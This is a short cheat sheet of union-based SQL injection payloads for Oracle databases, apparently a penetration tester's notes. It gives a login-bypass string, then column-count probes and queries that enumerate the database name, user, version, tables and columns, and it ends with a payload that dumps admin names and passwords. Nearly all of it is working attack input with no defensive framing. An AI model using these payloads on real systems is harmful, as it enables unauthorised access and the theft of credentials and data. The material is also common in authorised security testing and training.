Oracle DB Union based Injection 
**********************************

Login Page
##############

For login page try the following to login

.. code-block:: console

   ' or 1=1 -- 

Test Injection
##################

Make sure when you are testing the NULL injections that it doesn't error out. When it starts erroring out, do the last null you did before.

.. code-block:: console

        ' order by 3 --
        ' union select null,null,null from dual --
        ' union select 1,2,3 from dual --

**Note, the rest of the commands are assuming the NULL is three.**

Find DB Name
##############

.. code-block:: console

   ' union select ora_database_name,null,null from dual --

Find User
###########

.. code-block:: console

   ' union select user,null,null from dual --

Find Version
###############

.. code-block:: console

   ' union select (select banner from v$version where rownum=1),null,null from dual --

Get Table Names
##################

.. code-block:: console

   ' union select table_name,null,null from all_tables --


Get columns from specific tables
####################################

.. code-block:: console

   ' union select column_name,null,null from all_tab_columns where table_name='<table from previous command>'--

Extract data from columns
############################

This assumes the table has a column of ADMIN_NAME and PASSWORD.

.. code-block:: console

   ' union select ADMIN_NAME||PASSWORD,null,null from <table_name> --
